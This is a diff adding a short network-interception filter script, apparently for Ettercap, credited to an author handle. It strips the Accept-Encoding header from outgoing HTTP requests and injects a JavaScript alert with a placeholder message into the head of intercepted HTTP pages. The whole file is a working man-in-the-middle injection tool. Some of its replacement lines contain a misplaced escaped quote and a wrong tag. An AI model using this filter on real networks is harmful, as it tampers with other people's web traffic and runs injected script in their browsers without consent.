@@ -1,0 +1,17 @@
+# Author: Bl4ck5w4n ||
+# Description: This sends an alert box with your message. ||
+# Type: Single ||
+
+
+if (ip.proto == TCP && tcp.dst == 80) {
+	if (search(DATA.data, "Accept-Encoding")) {
+		replace("Accept-Encoding", "Accept-Rubbish!"); 
+		msg("changed Accept-Encoding!\n");
+	}
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+	replace("</HEAD>", "</HEAD><script type=\"text/javascript\">alert('REPLACE_ME');</script>\");
+	replace("<head>", "</head><script type=\"text/javascript\">alert('REPLACE_ME');</script>\");
+	msg("Filter Ran.\n");
+} 
